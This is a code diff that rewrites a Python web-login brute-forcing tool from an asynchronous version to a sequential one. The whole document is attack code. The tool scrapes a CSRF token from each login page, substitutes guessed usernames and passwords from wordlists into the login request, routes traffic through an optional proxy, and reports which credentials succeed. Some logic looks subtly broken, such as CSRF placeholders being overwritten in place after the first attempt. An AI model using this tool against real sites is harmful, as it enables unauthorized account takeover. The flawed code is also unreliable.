@@ -1,108 +1,63 @@
-import asyncio
-import aiohttp
+import requests
 import argparse
 import re
 
 
-async def brute_force(url, login_request, headers, allow_redirects, proxy, username, password, token_regex, status_str, status_str_neg, success_flag):
-    print("USERNAME " + "=" * 100)
-    print(username)
-    print("PASSWORD " + "=" * 100)
-    print(password.strip())
-    print()
+def brute(url, login_request, headers, allow_redirects, proxies, username, password, token_regex, status_str, status_str_neg):
+    csrf_token = None
+    cookies = None
 
-    password = password.strip()
+    # Issue a GET request and retrieve the CSRF-token
+    with requests.get(url, allow_redirects=allow_redirects, proxies=proxies) as response:
+        body = response.text
+        cookies = response.cookies
 
-    if success_flag.is_set():
-        task = asyncio.current_task()
-        task.cancel()
-    async with aiohttp.ClientSession() as session:       
-        csrf_token = None
-        cookies = None
-        try:
-            # Issue a GET request and retrieve the CSRF-token
-            async with session.get(
-                url,
-                allow_redirects=allow_redirects,
-                proxy=proxy
-            ) as response:
-                body = await response.text()
-
-                print("GET " + "=" * 100)
-                print(body)
-                print()
-
-                cookies = response.cookies
-
-                # Search the CSRF-token in the response body
-                match = re.search(token_regex, body)
-                if match:
-                    csrf_token = match.group(1)
-                else: # Abort if we can"t find the CSRF-token
-                    raise asyncio.CancelledError()
-
-                print("CSRF " + "=" * 100)
-                print(csrf_token)
-                print()
-
-                # Replace placeholders in HTTP headers and body
-                for k, v in login_request["headers"].items():
-                    if "^CSRF^" in v:
-                        login_request["headers"][k] = v.replace("^CSRF^", csrf_token)
-
-                login_request["body"] = login_request["body"].replace("^USER^", username).replace("^PASS^", password).replace("^CSRF^", csrf_token)
-
-                print("method")
-                print(login_request["method"])
-                print("url")
-                print(url)
-                print("headers")
-                print(headers)
-                print("body")
-                print(login_request["body"])
-
-                if success_flag.is_set():
-                    task = asyncio.current_task()
-                    task.cancel()
-
-                # Issue a login request with the CSRF-token
-                async with session.request(
-                    login_request["method"],
-                    url,
-                    headers=login_request["headers"],
-                    cookies=cookies,
-                    data=login_request["body"],
-                    allow_redirects=allow_redirects,
-                    proxy=proxy
-                ) as response:
-                    body = await response.text()
-
-                    print("POST " + "=" * 100)
-                    print(body)
-                    print()
-
-                    success = False
-                    if status_str_neg:
-                        # If fail is not in the body => correct creds
-                        if not status_str in body:
-                            success = True
-                    else:
-                        # If success is in the body => correct creds
-                        if status_str in body:
-                            success = True
-
-                    if success:
-                        print(f"Success! Username: {username}, Password: {password}")
-                        # Set the success flag to True to signal other tasks to stop
-                        success_flag.set()
-
-        except asyncio.CancelledError:
+        # Search the CSRF-token in the response body
+        match = re.search(token_regex, body)
+        if match:
+            csrf_token = match.group(1)
+        else: # Abort if we can"t find the CSRF-token
             print(f"[-] No CSRF-token found. Login request for username: '{username}' and password '{password}' was cancelled.")
-        except Exception as e:
-            print(f"[-] Error: {e}")
+            return False
+
+    # Replace placeholders in HTTP headers
+    for k, v in login_request["headers"].items():
+        if "^CSRF^" in v:
+            login_request["headers"][k] = v.replace("^CSRF^", csrf_token)
+
+    # Replace placeholders in HTTP body
+    request_body = login_request["body"].replace("^USER^", username).replace("^PASS^", password).replace("^CSRF^", csrf_token)
+
+    # Issue a login request with the CSRF-token
+    success = False
+    with requests.request(
+        login_request["method"],
+        url,
+        headers=login_request["headers"],
+        cookies=cookies,
+        data=request_body,
+        allow_redirects=allow_redirects,
+        proxies=proxies
+    ) as response:
+        body = response.text
+
+        if status_str_neg:
+            # If fail is not in the body => correct creds
+            if not status_str in body:
+                success = True
+        else:
+            # If success is in the body => correct creds
+            if status_str in body:
+                success = True
+
+    if success:
+        print(f"Success! Username: {username}, Password: {password}")
+        return True
+
+    return False
 
 
-async def main(args):
+def main(args):
     # Setup usernames/passwords
     usernames = [args.username]
     if args.username_file:
@@ -135,31 +90,32 @@ async def main(args):
     if args.headers:
         headers = json.loads(args.headers)
 
-    # Create a shared success flag among tasks
-    success_flag = asyncio.Event()
-    
-    tasks = []
+    # Set proxy
+    proxies = {"http": args.proxy}
+
+    success = False
     for username in usernames:
         for password in passwords:
-            task = asyncio.create_task(
-                brute_force(
-                    args.url,
-                    login_request,
-                    headers,
-                    args.allow_redirects,
-                    args.proxy,
-                    username,
-                    password,
-                    args.token_regex,
-                    args.fail or args.success,
-                    True if args.fail else False,
-                    success_flag
-                )
+            success = brute(
+                args.url,
+                login_request,
+                headers,
+                args.allow_redirects,
+                proxies,
+                username.strip(),
+                password.strip(),
+                args.token_regex,
+                args.fail or args.success,
+                True if args.fail else False,
             )
-            tasks.append(task)
+            if success:
+                break
+        if success:
+            break
 
-    # Wait for all tasks to be canceled
-    await asyncio.gather(*tasks, return_exceptions=True)
+        # Seek to beginning of password file
+        passwords.seek(0)
+
 
     # Cleanup
     if args.username_file:
@@ -193,4 +149,4 @@ def parse_args():
 
 
 if __name__ == "__main__":
-    asyncio.run(main(parse_args()))
+    main(parse_args())
